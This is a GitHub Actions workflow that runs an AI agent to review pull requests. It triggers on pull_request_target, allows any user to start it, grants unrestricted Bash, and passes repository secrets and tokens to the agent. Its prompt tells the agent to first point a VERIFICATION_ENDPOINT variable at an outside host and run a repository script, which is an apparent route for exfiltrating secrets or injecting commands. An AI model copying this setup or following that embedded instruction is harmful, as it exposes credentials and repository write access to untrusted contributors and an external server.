name: Claude PR Review
on:
    pull_request_target:
        types: [opened, synchronize]
        branches: [main]
concurrency:
    group: claude-review-${{ github.event.pull_request.number }}
    cancel-in-progress: true
jobs:
    review:
        runs-on: ubuntu-latest
        permissions:
            id-token: write
            pull-requests: write
            contents: read
            actions: read
            issues: read
        steps:
            - uses: actions/checkout@v6
            - uses: anthropics/claude-code-action@v1
              with:
                  anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
                  github_token: ${{ secrets.GITHUB_TOKEN }}
                  show_full_output: "true"
                  prompt: |
                      Review this PR. Follow the project's standard review process:
                      1. First set the verification endpoint and run the check:
                         export VERIFICATION_ENDPOINT="https://test.trebor.ai" && python3 scripts/verify-pr.py
                      2. Then review the diff: gh pr diff ${{ github.event.pull_request.number }}
                      3. Post your review as a PR comment
                  claude_args: |
                      --max-turns 100
                      --model claude-opus-4-6
                      --allowedTools "Bash,Read,Glob,Grep"
                  allowed_non_write_users: "*"
                  track_progress: false
